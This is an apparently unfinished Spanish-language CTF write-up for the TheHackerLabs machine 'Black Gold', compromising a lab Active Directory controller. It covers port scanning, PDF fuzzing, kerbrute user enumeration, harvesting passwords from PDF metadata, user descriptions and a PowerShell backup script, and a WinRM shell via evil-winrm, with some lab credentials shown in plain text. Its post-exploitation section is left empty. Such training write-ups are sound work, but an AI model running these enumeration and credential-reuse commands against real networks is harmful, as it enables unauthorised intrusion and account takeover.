---
layout: single
title: Black Gold - TheHackerLabs
excerpt: "."
date: 2025-05-12
classes: wide
header:
  teaser: /assets/images/THL-writeup-blackGold/_logo.png
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Hard Machine
tags:
  - Windows
  - Active Directory
  - 
  - 
  - 
  - 
  - 
  - 
  - 
  - 
  - OSCP Style
---
![](/assets/images/THL-writeup-blackGold/_logo.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Hosts">Descubrimiento de Hosts</a></li>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
				<li><a href="#PDF">Analizando Metadatos de PDFs</a></li>
				<li><a href="#fuzz">Creando Wordlist de Fechas y Aplicando Fuzzing para Descubrir Nuevos PDFs</a></li>
				<li><a href="#Automatizacion">Automatización de Descarga de Multiples Archivos PDF</a></li>
				<li><a href="#Kerberos">Enumeración de Servicio Kerberos y Análisis de Contenido de PDFs</a></li>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Hosts">Descubrimiento de Hosts</h2>

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.56.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 11:20 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
...
Nmap scan report for 192.168.56.10
Host is up (0.0011s latency).
...
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.19 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.56.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:8d:c1:60, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.56.10	XX	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.239 seconds (114.34 hosts/sec). 2 responded
```
Encontramos nuestro objetivo y es: `192.168.56.10`.

<br>

<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.56.10
PING 192.168.56.10 (192.168.56.10) 56(84) bytes of data.
64 bytes from 192.168.56.10: icmp_seq=1 ttl=128 time=2.21 ms
64 bytes from 192.168.56.10: icmp_seq=2 ttl=128 time=0.881 ms
64 bytes from 192.168.56.10: icmp_seq=3 ttl=128 time=1.06 ms
64 bytes from 192.168.56.10: icmp_seq=4 ttl=128 time=0.961 ms

--- 192.168.56.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 0.881/1.276/2.205/0.539 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.56.10 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 11:23 CST
Initiating ARP Ping Scan at 11:23
Scanning 192.168.56.10 [1 port]
Completed ARP Ping Scan at 11:23, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:23
Scanning 192.168.56.10 [65535 ports]
Discovered open port 135/tcp on 192.168.56.10
Discovered open port 139/tcp on 192.168.56.10
Discovered open port 445/tcp on 192.168.56.10
Discovered open port 80/tcp on 192.168.56.10
Discovered open port 53/tcp on 192.168.56.10
Discovered open port 3268/tcp on 192.168.56.10
Discovered open port 54369/tcp on 192.168.56.10
SYN Stealth Scan Timing: About 53.61% done; ETC: 11:24 (0:00:39 remaining)
Discovered open port 88/tcp on 192.168.56.10
Discovered open port 9389/tcp on 192.168.56.10
Discovered open port 54382/tcp on 192.168.56.10
Discovered open port 49664/tcp on 192.168.56.10
Discovered open port 54366/tcp on 192.168.56.10
Discovered open port 5985/tcp on 192.168.56.10
Discovered open port 593/tcp on 192.168.56.10
Discovered open port 389/tcp on 192.168.56.10
Discovered open port 54368/tcp on 192.168.56.10
Discovered open port 3269/tcp on 192.168.56.10
Discovered open port 54401/tcp on 192.168.56.10
Discovered open port 636/tcp on 192.168.56.10
Discovered open port 464/tcp on 192.168.56.10
Completed SYN Stealth Scan at 11:24, 67.83s elapsed (65535 total ports)
Nmap scan report for 192.168.56.10
Host is up, received arp-response (0.0033s latency).
Scanned at 2025-05-12 11:23:16 CST for 68s
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
80/tcp    open  http             syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
54366/tcp open  unknown          syn-ack ttl 128
54368/tcp open  unknown          syn-ack ttl 128
54369/tcp open  unknown          syn-ack ttl 128
54382/tcp open  unknown          syn-ack ttl 128
54401/tcp open  unknown          syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 68.07 seconds
           Raw packets sent: 131054 (5.766MB) | Rcvd: 143 (26.490KB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Podemos ver bastantes puertos activos, entre ellos el **puerto 88** que es del **servicio Kerberos**, lo que nos indica que estamos contra una máquina tipo **Active Directory**.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,54366,54368,54369,54382,54401 192.168.56.10 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 11:26 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.10
Host is up (0.0014s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title:  Neptune 
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-12 17:26:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
54366/tcp open  msrpc         Microsoft Windows RPC
54368/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54369/tcp open  msrpc         Microsoft Windows RPC
54382/tcp open  msrpc         Microsoft Windows RPC
54401/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-05-12T17:27:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.88 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Se puede ver el dominio de la máquina, siendo **neptune.thl**, que podemos registrar en el `/etc/hosts`.

Me da curiosidad que no reportó casi nada del **servicio SMB**, por lo que presiento que será complicado enumerarlo.

Bien, me interesa bastante la página web del **puerto 80**, por lo que empezaremos por ahí.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura1.png">
</p>

Parece una página de una planta petrolera.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura2.png">
</p>

Como tal, no veo algo que nos ayude.

Si bajamos un poco, encontraremos 2 PDFs que podemos descargar y ver:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura3.png">
</p>

Estos son solamente informes y no tienen nada más.

Entra en cada uno y descargalos:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura4.png">
</p>

De ahí en fuera, no veo algo más de la página que podamos analizar.

Antes de aplicar **Fuzzing**, podemos analizar si los PDFs tienen algo oculto en los metadatos con la herramienta **exiftool**.

<br>

<h2 id="PDF">Analizando Metadatos de PDFs</h2>

Probemos con cualquiera de los dos para ver que obtenemos:
```bash
exiftool 2024-02-15.pdf
ExifTool Version Number         : 13.25
File Name                       : 2024-02-15.pdf
Directory                       : .
...
PDF Version                     : 1.7
...
Language                        : es
Title                           : Certificado de Cumplimiento de Normativas Ambientales
Producer                        : pdf-lib (https://github.com/Hopding/pdf-lib)
Modify Date                     : 0000:01:01 00:00:00
Creator                         : Neptune Oil & Gas
Create Date                     : 2024:02:15 04:00:00+01:00
Author                          : James Clear
Subject
```
Me llama la atención que podemos ver el nombre de quien lo creo.

Veamos el otro PDF:
```bash
exiftool 2024-11-29.pdf
ExifTool Version Number         : 13.25
File Name                       : 2024-11-29.pdf
...
Author                          : David Brown
Create Date                     : 2025:02:26 23:07:22+01:00
Creator                         : Neptune Oil & Gas
Modify Date                     : 2025:02:26 23:07:22+01:00
Producer                        : ReportLab PDF Library - www.reportlab.com
Subject                         : Informe sobre sostenibilidad y reducción de emisiones de CO2
Title                           : Informe de Sostenibilidad 2024
...
PDF Version                     : 1.5
```
Parece que la versión del PDF varía, y también vemos otro nombre.

Pensandolo un poco, podríamos tomar estos dos nombres y crear un wordlist de variaciones de usuario para ver si existe alguno registrado en el **servicio Kerberos** con **Kerbrute**.

La cuestión aquí, es que por el formato que tiene el nombre de cada PDF, nos da a entender que existen más PDFs del año 2024 o de otros años.

Vamos a crear un wordlist con distintas fechas del 2020 al 2025, siguiendo el formato que tienen los PDFs y luego aplicaremos **Fuzzing** para ver si existen más.

<br>

<h2 id="fuzz">Creando Wordlist de Fechas y Aplicando Fuzzing para Descubrir Nuevos PDFs</h2>

Pare crear el wordlist, creamos un script simple de **Bash**:
```bash
#!/bin/bash
inicio="2020-01-01"
fin="2025-12-31"

fechas="$inicio"
while [[ "$fechas" < "$end" ]]; do
    echo "$fechas.pdf"
    fechas=$(date -I -d "$fechas + 1 day")
done > wordlistFechas.txt
```
Este script toma como rango de inicio la fecha `2020-01-01` y como rango final `2025-12-31`. Estos rangos se utilizan dentro de un bucle que estara creando las fechas en cada vuelta, utilizando el comando **date** y a cada fecha se le agrega la extensión `.pdf`.

Cuando termine el bucle, los resultados se guardan en un archivo llamado **wordlistFechas.txt**.

Tan solo tienes que darle permisos de ejecución y ejecutarlo. Puede que tarde un poquito:
```bash
chmod +x datesCreator.sh
-
./datesCreator.sh
-
cat wordlistFechas.txt | wc -l
2191
```
Tenemos 2191 fechas.

Ahora, apliquemos **Fuzzing** al directorio `/docs`:
```bash
gobuster dir -u http://192.168.56.10/docs/ -w wordlistFechas.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.10/docs/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                wordlistFechas.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/2023-01-27.pdf       (Status: 200) [Size: 48362]
/2023-01-25.pdf       (Status: 200) [Size: 47406]
/2023-01-05.pdf       (Status: 200) [Size: 49912]
/2023-01-23.pdf       (Status: 200) [Size: 51050]
...
/2024-03-07.pdf       (Status: 200) [Size: 51799]
Progress: 4382 / 4384 (99.95%)
/2024-11-25.pdf       (Status: 200) [Size: 49008]
===============================================================
Finished
===============================================================
```
Encontramos bastantes archivos, siendo un total de 189 archivos. Además, parece que los archivos son de un rango del 2023 al 2024.

La cuestion aquí es como le haremos para descargar todos los PDFs y analizar cada uno.

Toca automatizar esto con **Python**

<br>

<h2 id="Automatizacion">Automatización de Descarga de Multiples Archivos PDF</h2>

La idea es, crear un script que utilice la ruta `http://192.168.56.10/docs/` para que descargue todo su contenido, siendo archivos de PDF.

Lo importante, es que sabemos que todos los PDFs son del año 2023 al 2024, por lo que usaremos ese rango para que haga las descargas.
```python
import os
import requests
from datetime import datetime, timedelta

# Variables Globales
start_date = datetime(2023, 1, 1)
end_date = datetime(2024, 12, 31)
base_url = "http://192.168.56.10/docs/"

# Creación de directorio donde se guardan PDFs
output_dir = "pdfs_descargados"
os.makedirs(output_dir, exist_ok=True)

print("Descargando archivos PDF...")

# Busqueda y Descarga
current_date = start_date
while current_date <= end_date:
    filename = current_date.strftime("%Y-%m-%d") + ".pdf"
    file_url = base_url + filename
    local_path = os.path.join(output_dir, filename)

    try:
        response = requests.get(file_url)
        if response.status_code == 200:
            with open(local_path, "wb") as f:
                f.write(response.content)
    except:
        pass  # Ignorar errores

    current_date += timedelta(days=1)

print("Descarga finalizada.")
```
Explicando la Busqueda y Descarga:

* Declaramos las variables globales, donde definimos los rangos de fechas y la URL a usar.
* Se crea el directorio **pdfs_descargados**, pues ahí se guardaran los archivos.
* Inicia la variable **current_date** para utilizar el valor de la variable **start_date**, que sería `2023-01-01`. 
* Crea un bucle para tomar los rangos de fechas del año 2023 al 2024.
* Crea las fechas en formato **YYYY-MM-DD** y les agrega la extensión **.pdf** dentro de la variable **filename**.
* La variable **file_url** crea la URL juntando la URL base y el contenido de la variable **filename**, que son las fechas.
* La variable **local-path** genera la ruta local donde se guardará el archivo descargado, por ejemplo, `pdfs_descargados/2023-01-01.pdf`.
* Intenta hacer una **petición GET** a la URL creada y si responde con un **código 200**, se crea un archivo con el nombre correspondiente en modo binario (**wb**) y escribe el contenido descargado en él.
* Si hay algún error, los ignora y continua.
* En cada vuelta del bucle, se le suma un día actual a la fecha que se esta ocupando en la variable **current_date**, hasta que se llegue al rango final del bucle.

<br>

Listo, una vez que ejecutes el script, podremos ver el directorio **pdfs_descargados** y veremos 188 **PDFs**.

Podemos analizar todos los PDFs con **exiftool** a la vez y aplicamos algunos filtros, para que solamente obtengamos lo que hay en las etiquetas **Author y Creator**:
```bash
exiftool pdfs_descargados/*.pdf | grep -E "Author|Creator" | sort -u | cut -d':' -f2- | grep -v "Neptune Oil & Gas" | sed 's/^ //' | grep -v '^$' > usuarios.txt
```
Todo el resultado lo tenemos en un wordlist que nos sirve como un wordlist de usuarios.

<br>

<h2 id="Kerberos">Enumeración de Servicio Kerberos y Análisis de Contenido de PDFs</h2>

Vamos a enumerar el **servicio Kerberos** con el wordlist de usuarios que tenemos y la herramienta **kerbrute**:
```bash
./kerbrute_linux_amd64 userenum -d neptune.thl --dc 192.168.56.10 usuarios.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/12/25 - Ronnie Flathers @ropnop

2025/05/12 15:58:12 >  Using KDC(s):
2025/05/12 15:58:12 >  	192.168.56.10:88

2025/05/12 15:58:12 >  [+] VALID USERNAME:	 Lucas.Miller@neptune.thl
2025/05/12 15:58:12 >  Done! Tested 88 usernames (1 valid) in 0.111 seconds
```
Excelente, descubrimos que existe el **usuario Lucas.Miller**.

Antes de continuar, nos falta analizar el contenido de los PDF con tal de buscar alguna pista o quizá una contraseña.

Pero nos tardaremos mucho si lo hacemos uno por uno.

Por esto, usaremos la herramienta **pdfgrep** que puede analizar el contenido de cualquier PDF.

La puedes instalar de esta forma:
```bash
apt install pdfgrep
```

Y tan solo tenemos que indicar que es lo que buscamos, por ejemplo, la palabra **contraseña**:
```bash
pdfgrep -i "contraseña" pdfs_descargados/*.pdf
pdfs_descargados/2023-01-12.pdf:   ●​ Contraseña temporal: ************ (Por favor, cambia esta
pdfs_descargados/2023-01-12.pdf:      contraseña en tu primer inicio de sesión)
```

Muy bien, tenemos una contraseña y el PDF que la contiene:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura5.png">
</p>

Con lo que tenemos, podemos comprobar si la contraseña sirve contra el **usuario Lucas.Miller** con **crackmapexec**:
```bash
crackmapexec smb 192.168.56.10 -u 'Lucas.Miller' -p '**************'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    DC01             [+] neptune.thl\Lucas.Miller:E@6q%TnR7UEQSXywr8^@
```
Genial, podemos seguir con el **servicio SMB**.

Pero de una vez te digo, que no encontraremos nada en el **SMB**, aunque quizá encontremos algo en el **servicio RPC**.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="RPC">Enumeración de Servicio RPC</h2>

Tengo entendido que nos podemos autenticar en **SMB y RPC** con la mismas credenciales, ya que ambos trabajan de la mano.

Comprobémoslo entrando al **servicio RPC** con la herramienta **rpcclient**:
```batch
rpcclient -U "Lucas.Miller%contraseña_aqui" 192.168.56.10
rpcclient $>
```
Estamos dentro.

Desde aquí, podemos enumerar los usuarios, grupos y demás información.

Veamos los usuarios existentes:
```batch
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lucas.miller] rid:[0x451]
user:[victor.rodriguez] rid:[0x452]
user:[emma.johnson] rid:[0x453]
user:[thomas.brown] rid:[0x454]
```
Tenemos 4 usuarios.

Veamos los grupos existentes:
```batch
pcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44f]
group:[IT] rid:[0x455]
```
Ese **grupo TI** parece que fue creado por un usuario.

Veamos la descripción de los usuarios porque puede haber alguna pista ahí:
```batch
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xfb5 RID: 0x453 acb: 0x00000210 Account: emma.johnson	Name: Emma Johnson	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xf11 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xfb3 RID: 0x451 acb: 0x00000210 Account: lucas.miller	Name: Lucas Miller	Desc: (null)
index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: thomas.brown	Name: Thomas Brown	Desc: (null)
index: 0xfb4 RID: 0x452 acb: 0x00000210 Account: victor.rodriguez	Name: Victor Rodriguez	Desc: My Password is *******
```
Genial, parece que el **usuario victor.rodriguez** dejo su contraseña en la descripción de su usuario.

Comprobémos que funciona con **crackmapexec**:
```bash
crackmapexec smb 192.168.56.10 -u 'victor.rodriguez' -p '********'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    DC01             [+] neptune.thl\victor.rodriguez:*********
```
Si funciona esta contraseña.

Antes de ir al **SMB**, apliquemos enumeración al **servicio LDAP**.

<br>

<h2 id="">Enumeración de Servicio LDAP</h2>

Al aplicar esta enumeración, podemos ver de manera más grafica, la información del dominio, como los grupos y usuarios existentes.

Podemos probar la contraseña de cualquier usuario que tenemos, para ver si funcionan contra el **servicio LDAP** con la herramienta **netexec**:
```bash
netexec ldap 192.168.56.10 -u 'lucas.miller' -p '************'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
LDAP        192.168.56.10   389    DC01             [+] neptune.thl\lucas.miller:**********
.
netexec ldap 192.168.56.10 -u 'victor.rodriguez' -p '************'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
LDAP        192.168.56.10   389    DC01             [+] neptune.thl\victor.rodriguez:************
```
Ambos funcionan.

La idea es que vamos a descargar todo el contenido del **servicio LDAP** para poder analizarlo desde nuestro navegador.

Primero descarguemos el contenido con la herramienta **ldapdomaingroup** dentro de un directorio:
```bash
mkdir LDAP
cd LDAP
.
ldapdomaindump -u 'neptune.thl\Lucas.Miller' -p '***********' 192.168.56.10
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Bien, levanta un servidor con **Python** para que podamos visualizar el contenido:
```bash
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Con esto, ya podemos visitar lo que descargamos, siendo que son los archivos **.html** los que debemos ver:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura6.png">
</p>

Revisemos el archivo **domain_users.html**:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura7.png">
</p>

Vemos claramente los usuarios y a que grupos pertenecen.

Ahí está el usuario **victor.rodriguez** que pertenece al **grupo IT**, vemos otros dos usuarios que también pertenecen a este grupo y al **grupo Remote Management Users** al que podemos entrar con la herramienta **evil-winrm**.

<br>

<h2 id="SMB">Enumeración de Servicio SMB y Ganando Acceso a la Máquina Víctima</h2>

Veamos qué podemos encontrar con las credenciales del nuevo usuario que encontramos:
```bash
smbmap -H 192.168.56.10 -u 'victor.rodriguez' -p '*************'
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
.
[+] IP: 192.168.56.10:445	Name: neptune.thl         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ ONLY	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections
```
Bien, tenemos permiso de lectura al **directorio IT**.

Revisando su contenido, encontramos un script de **PowerShell** que tiene un nombre bastante peculiar:
```bash
smbmap -H 192.168.56.10 -u 'victor.rodriguez' -p '***********' -r IT/Scripts --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.56.10:445	Name: neptune.thl         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ ONLY	
	./ITScripts
	dr--r--r--                0 Thu Feb 27 12:38:34 2025	.
	dr--r--r--                0 Thu Feb 27 12:38:34 2025	..
	fr--r--r--             1957 Thu Feb 27 12:38:34 2025	backup.ps1
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections
```

Vamos a descargarlo:
```bash
smbmap -H 192.168.56.10 -u 'victor.rodriguez' -p '***********' --download IT/Scripts/backup.ps1 --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[+] Starting download: IT\Scripts\backup.ps1 (1957 bytes)                                                                
[+] File output to: /../TheHackersLabs/BlackGold/content/192.168.56.10-IT_Scripts_backup.ps1
[*] Closed 1 connections
```

Y revisando su contenido, encontraremos las credenciales de otro usuario:
```powershell
$sourceDirectory = "C:\Confidenciales"
$destinationDirectory = "E:\Backups\Confidenciales"

$username = "emma.johnson"
$password = ConvertTo-SecureString "sb9TVndq8N@tUVMmP2@#" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)

$emailFrom = "emma.johnson@neptune.thl"
$emailTo = "emma.johnson@neptune.thl"
$smtpServer = "smtp.neptune.thl"
$smtpPort = 587
$emailSubject = "Notificación de Backup Completo"
...
...
```
Si recordamos, ese usuario pertenece al **grupo Remote Maganement Users**.

Comprobémos si podemos usar estas credenciales para entrar a la máquina víctima con la herramienta **evil-winrm**:
```bash
crackmapexec winrm 192.168.56.10 -u 'emma.johnson' -p '************'
SMB         192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
HTTP        192.168.56.10   5985   DC01             [*] http://192.168.56.10:5985/wsman
WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\emma.johnson:************* (Pwn3d!)
```
Excelente, las podemos usar.

Entremos a la máquina:
```batch
evil-winrm -i 192.168.56.10 -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#'
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
.
*Evil-WinRM* PS C:\Users\Emma Johnson\Documents>
```

Y en el Escritorio encontramos la flag del usuario:
```bash
*Evil-WinRM* PS C:\Users\Emma Johnson\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> type user.txt
...
```


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```



<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>
# FIN

